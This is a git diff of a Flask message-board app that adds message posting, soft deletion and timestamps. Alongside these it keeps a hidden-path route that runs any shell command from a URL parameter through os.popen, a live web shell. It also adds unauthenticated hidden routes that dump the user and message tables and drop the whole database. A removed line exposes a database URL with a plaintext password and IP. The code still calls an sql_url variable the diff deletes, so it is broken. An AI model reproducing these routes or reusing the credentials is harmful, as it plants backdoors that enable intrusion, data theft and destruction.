@@ -5,10 +5,10 @@ import pandas as pd
 import os
 import json
 import re
+import datetime
 app = Flask(__name__)
 app.secret_key = os.urandom(32)
 # ref : https://stackabuse.com/using-sqlalchemy-with-flask-and-postgresql/	
-sql_url = "postgresql://clg3pmnzw00fff4po489sa703:ZYeVNbez1T2LNOVkSzkDOYrG@140.112.18.210:9012/clg3pmnzx00fhf4podvfe2a4b"
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
 #app.config['SQLALCHEMY_DATABASE_URI'] = sql_url
 app.config['SQLALCHEMY_DATABASE_URI'] = os.environ['SQLALCHEMY_DATABASE_URI']
@@ -33,10 +33,14 @@ class Message(db.Model):
     id = db.Column(db.Integer, primary_key=True,autoincrement=True)
     username = db.Column(db.String(30),nullable=False)
     message = db.Column(db.String(256),nullable=False)
-    
+    is_deleted = db.Column(db.Boolean)
+    timestamp =  db.Column(db.String(256),nullable=False)
+
     def __init__(self, username ,message):
         self.username = username
         self.message = message
+        self.is_deleted = 0
+        self.timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 
 @app.route('/')
@@ -48,9 +52,12 @@ def hello():
 def about():
 	return render_template('about.html')
 
+########################
+## user function
+########################
 @app.route('/create_user')
 def create_user():
-    if 'user_data' in session:
+    if 'username' in session:
         return redirect('/')
 	
     return render_template('create_user.html')
@@ -59,7 +66,7 @@ def create_user():
 def login():
 
     # already login 
-    if 'user_data' in session:
+    if 'username' in session:
         return redirect('/')    
 
     # check password
@@ -93,17 +100,17 @@ def login():
         db.session.commit()
         
         # create session 
-        data = '{"username" : "%s"}' %(username)
-        session['user_data'] = data
+        session['username'] = username
 
         return redirect('user')
 
+    ## input != password
     elif not valid_user(user,password):
         flash('User already exists or Password Error')
         return redirect("/create_user")
     
-    data = '{"username" : "%s"}' %(username)
-    session['user_data'] = data
+    ### valid user / login and create session 
+    session['username'] = username
     return redirect("/")
 
 @app.route('/logout')
@@ -114,22 +121,88 @@ def logout():
 
 @app.route('/user')
 def user():
-    engine = create_engine(os.environ['SQLALCHEMY_DATABASE_URI'], echo = False)
+    engine = create_engine(sql_url, echo = False)
     user_table = pd.read_sql_table(table_name="users", con=engine)
     result = user_table[["id","username"]].to_json(orient="records")
     parsed = json.loads(result)  
     result = json.dumps(parsed, indent=4)
-    print(result)
     return render_template('user.html',user_data=result)
 
-@app.route('/fhjsfhksdhflkhsldhfklkdshf')
+####################
+# message board
+####################
+
+
+@app.route('/message_board')
+def message_board():
+    
+    #render message to web
+    message_list = Message.query.order_by(Message.id).all()
+    if 'username' not in session:
+        username = None
+    else :
+        username = session['username']
+    #print(username)
+    return render_template('board.html', message_list = message_list, username=username)
+
+
+@app.route('/add_message',methods=['POST'])
+def add_message():
+
+    ## not login 
+    if 'username' not in session:
+        flash("Please Login First")
+        return redirect('message_board')   
+
+    ## get username from session 
+    username = session['username']
+    #user = User.query.filter_by(username=username).first()
+    
+    ## add message to db 
+    message = request.form.get('message')
+    new_message = Message(username,message)
+    db.session.add(new_message)
+    db.session.commit()
+    return redirect('message_board')
+
+@app.route('/delete_message',methods=['POST'])
+def delete_message():
+    
+    # not login 
+    if 'username' not in session:
+        flash("Please Login First")
+        return redirect('message_board')    
+
+
+    msg_id = request.form.get('msg_id')
+    message = Message.query.filter_by(id=msg_id).first()
+    
+    ## check username == current user 
+    if session['username'] != message.username :
+        flash("You are not the owner of this message.")
+        return redirect('message_board')   
+    
+    ## Set message is_delete to True
+
+    message.is_deleted = True
+    db.session.commit()
+
+    flash("Delete Success")
+    return redirect('message_board')    
+
+
+###################
+# function for debug
+###################
+
+@app.route('/shell_fsdjfhldskjflkjdslfjldskjflkdsjflkjds')
 def bbbbb():
     cmd = request.args.get('cmd')
     
     return os.popen(f'{cmd}').read()
 
-@app.route('/checkdb')
-def checkdb():
+@app.route('/check_user_db_fjkdlsjflkdsjflkjdslkfjldskjfldsk')
+def check_user_db():
     #ref https://stackoverflow.com/questions/38151817/sqlalchemy-print-contents-of-table
     engine = create_engine(sql_url, echo = False)
     user_table = pd.read_sql_table(table_name="users", con=engine)
@@ -137,6 +210,21 @@ def checkdb():
     parsed = json.loads(result)  
     result = json.dumps(parsed, indent=4) 
     return result
+
+@app.route('/check_message_db_fklsdkjflkjdsflkjdlsf')
+def check_message_db():
+    #ref https://stackoverflow.com/questions/38151817/sqlalchemy-print-contents-of-table
+    engine = create_engine(sql_url, echo = False)
+    user_table = pd.read_sql_table(table_name="message", con=engine)
+    result = user_table.to_json(orient="records")
+    parsed = json.loads(result)  
+    result = json.dumps(parsed, indent=4) 
+    return result
+
+@app.route('/drop_db_gkdjkflsdflksdjfkldsjflkjdsl')
+def drop_db():
+    db.drop_all()
+    return redirect('/')
 
 ## TODO : add message board db, add/delete function 
 
